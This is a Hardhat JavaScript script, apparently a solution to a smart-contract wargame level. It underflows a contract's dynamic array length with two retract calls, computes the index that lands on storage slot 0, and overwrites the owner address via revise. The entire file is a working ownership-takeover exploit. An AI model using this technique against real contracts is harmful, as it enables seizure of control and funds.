const codexABI = require("./abi.json");
const { web3, ethers } = require("hardhat");

const CODEX_ADDRESS = "0xe004ceC522845819fCB418daA8E49dBFf9C3C558";

async function printStorage() {
  console.log("Owner address:", await web3.eth.getStorageAt(CODEX_ADDRESS, 0));
  console.log("Codex array length:", await web3.eth.getStorageAt(CODEX_ADDRESS, 1));
  console.log("----------------------------------------------------------");
}

async function main() {
  const [user] = await ethers.getSigners();

  const CodexHelper = await ethers.getContractFactory("CodexHelper");
  const codexHelper = await CodexHelper.deploy();

  const codex = new web3.eth.Contract(codexABI, CODEX_ADDRESS);

  // Contact to be able to call other contract methods
  await codex.methods.make_contact().send({ from: user.address });
  console.log("Contacted", await codex.methods.contact().call());
  // Record value in order to set codex length to 1
  await codex.methods.record("0x626c756500000000000000000000000000000000000000000000000000000000").send({ from: user.address });
  console.log("First value recorded...");

  // Retract twice so that the stored array length becomes 2 ** 256
  await codex.methods.retract().send({ from: user.address });
  await codex.methods.retract().send({ from: user.address });
  console.log("Array length hacked...");

  await printStorage();
  const ownerIndex = await codexHelper.getCodexIndex(1);

  await codex.methods.revise(ownerIndex, "0x0000000000000000000000008748a7D09e77F57999Ae0d24Fe27458BAc7A352e").send({ from: user.address });

  await printStorage();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
